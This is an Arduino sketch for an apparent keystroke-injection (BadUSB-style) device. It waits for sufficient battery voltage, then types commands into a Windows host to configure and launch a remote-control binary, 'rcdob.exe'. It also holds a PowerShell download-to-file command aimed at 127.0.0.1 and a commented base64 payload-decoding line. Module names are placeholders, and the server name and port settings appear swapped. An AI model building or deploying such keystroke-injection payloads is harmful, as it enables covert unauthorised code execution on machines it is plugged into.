#include "Keyboard.h"

char binaryCmdline[] = "start rcdob.exe ";
char userAgentConfig[] = "set RCDO_USERAGENT=firefox";
char serverNameConfig[] = "set RCDO_SERVERPORT=localhost";
char serverPortConfig[] = "set RCDO_SERVERNAME=5000";
char powershellCmd[] = "iwr -Uri \"http://127.0.0.1/download\" -OutFile rcdob.exe";
//$file = ".\input.txt"; [System.Convert]::FromBase64String((Get-Content $file)) | Set-Content output.bin -Encoding Byte


float getVCC() {
  SYSCTRL->VREF.reg |= SYSCTRL_VREF_BGOUTEN;
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  ADC->SAMPCTRL.bit.SAMPLEN = 0x1;
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  ADC->INPUTCTRL.bit.MUXPOS = 0x19;         // Internal bandgap input
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  ADC->CTRLA.bit.ENABLE = 0x01;             // Enable ADC
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  ADC->SWTRIG.bit.START = 1;  // Start conversion
  ADC->INTFLAG.bit.RESRDY = 1;  // Clear the Data Ready flag
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  ADC->SWTRIG.bit.START = 1;  // Start the conversion again to throw out first value
  while ( ADC->INTFLAG.bit.RESRDY == 0 );   // Waiting for conversion to complete
  uint32_t valueRead = ADC->RESULT.reg;
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  ADC->CTRLA.bit.ENABLE = 0x00;             // Disable ADC
  while (ADC->STATUS.bit.SYNCBUSY == 1);
  SYSCTRL->VREF.reg &= ~SYSCTRL_VREF_BGOUTEN;
  float vcc = (1.1 * 1023.0) / valueRead;
  return vcc;
}

// gets current input voltage
float getBattVoltage(void) {
  const int VBATTpin = A4;
  float VCC = getVCC();

  // Use resistor division and math to get the voltage
  float resistorDiv = 0.5;
  float ADCres = 1023.0;
  float battVoltageReading = analogRead(VBATTpin);
  battVoltageReading = analogRead(VBATTpin); // Throw out first value
  float battVoltage = VCC * battVoltageReading / ADCres / resistorDiv;

  return battVoltage;
}


char* selectModules(uint8_t menuSelected){
  char* modules = (char*)calloc(512,1);
  if (modules == NULL){
    // handle error
    return "";
  }
  switch(menuSelected){
    case 1:
      strcpy(modules,"PLACEHOLDER1");
      break;
    case 2:
      strcpy(modules,"PLACEHOLDER2");
      break;
    case 3:
      strcpy(modules,"PLACEHOLDER3");
      break;
    case 4:
      strcpy(modules,"PLACEHOLDER4");
      break;
    default:
      break;
  }
  return modules;
}


// Keyboard needs to begin before this function is called.
void runPS(){
  Keyboard.write(0);
  delay(30);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.print('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell.exe");
  Keyboard.write(KEY_RETURN);
  delay(30);
  delay(500);
}

void setupConfig(){
  Keyboard.print(userAgentConfig);
  Keyboard.write(KEY_RETURN);
  delay(30);

  Keyboard.print(serverNameConfig);
  Keyboard.write(KEY_RETURN);
  delay(30);

  Keyboard.print(serverPortConfig);
  Keyboard.write(KEY_RETURN);
}

void startBinary(int option){
  SerialMonitorInterface.print(getVCC());
  pinMode(LED_BUILTIN, OUTPUT);

  // blocking loop until plugged in
  while(1){
    float battVoltageReading = getBattVoltage();
    if (battVoltageReading < 4.25)
    {
      digitalWrite(LED_BUILTIN, HIGH);   // turn the LED on (HIGH is the voltage level)
      delay(500);                       // wait for a second
      digitalWrite(LED_BUILTIN, LOW);    // turn the LED off by making the voltage LOW
      delay(500);  
    }
    else{
      break; 
    }
  }

  // wait 1 sec to allow for higher success rates
  // due to some funky windows USB recognition
  delay(1000);
  Keyboard.begin();
  //runPS();
  setupConfig();
  char buf[560];
  strcpy(buf,binaryCmdline);
  char *mods = selectModules(option);

  strcat(buf,mods);
  
  Keyboard.print(buf);
  Keyboard.write(KEY_RETURN);

  delay(500);
  Keyboard.print("exit");
  Keyboard.write(KEY_RETURN);

  delay(30);
  
  free(mods);
  Keyboard.end();
  
}
